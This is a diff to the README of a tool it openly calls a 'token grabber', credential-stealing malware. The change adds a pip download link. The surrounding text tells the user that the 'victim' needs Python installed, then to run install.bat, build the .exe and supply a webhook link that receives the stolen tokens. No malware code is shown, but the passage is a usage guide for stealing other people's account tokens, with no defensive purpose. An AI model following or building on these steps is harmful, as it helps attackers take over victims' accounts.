@@ -8,7 +8,7 @@ YOU HAVE TO DOWNLOAD ALL ( OLD VERSION WITH NEW VERSION ) AND DELETE THE TOKEN G
 
 Victim MUST have python ( no need package just only python ) then token grabber will WORKING
 # How to use :
-1. Install python ( if you don't have )
+1. Install python , pip Download [https://pypi.org/project/pip/] ( if you don't have )
 2. Run install.bat to download all package python
 3. Run .exe file to build
 4. Get your webhook link ![image](https://user-images.githubusercontent.com/103272479/162680456-1f85f50a-b1b9-46a0-bfc4-66e938582a76.png)
